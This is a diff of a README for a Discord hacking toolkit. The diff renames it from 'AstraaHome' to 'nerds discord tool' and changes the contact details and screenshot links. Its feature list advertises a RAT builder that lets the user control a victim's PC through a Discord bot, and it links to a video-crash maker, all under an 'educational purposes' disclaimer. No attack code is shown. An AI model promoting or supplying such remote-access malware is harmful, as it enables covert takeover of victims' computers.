@@ -30,10 +30,10 @@
 
 ## Disclaimer
 
-|AstraaHome was made for Educational purposes|
-|-------------------------------------------------|
+|nerds discord tool was made for Educational purposes|
+|----------------------------------------------------|
 This project was created only for good purposes and personal use.
-By using AstraaHome, you agree that you hold responsibility and accountability of any consequences caused by your actions.
+By using nerds tool, you agree that you hold responsibility and accountability of any consequences caused by your actions.
 
 ## Features
 - [x] - [RAT Tool](https://github.com/moom825/Discord-RAT) - Create a RAT file. Once the victim runs it, you can control his PC through a BOT Discord.
@@ -69,16 +69,15 @@ $ python3 astraahome.py
 
 ## Additional Informations
 General Informations:
-- If you have a problem, [CLICK HERE](https://www.youtube.com/watch?v=27-Swg_MUNw&t=16s) to watch the YouTube video.
 - Find your output files in the  [temp](/temp) folder.
-- If you find any malfunction, contact me on Discord: Astraa#1000.
+- If you find any malfunction, contact me on Discord: cat whisperer mk. 3#0003
 
 Script Informations:
 - For the operation of the RAT Tool, please refer to the [creator's page](https://github.com/moom825/Discord-RAT).
 - For the operation of the VideoCrash Maker, please refer to [this page](https://github.com/AstraaDev/Discord-VideoCrashMaker).
 
 ## Example
-![home.png](https://cdn.discordapp.com/attachments/826581697436581919/897160907879231498/unknown.png)
+![home.png](https://cdn.discordapp.com/attachments/944392730312855553/947386510368440340/unknown.png)
 
 ## Errors/Fixes
 
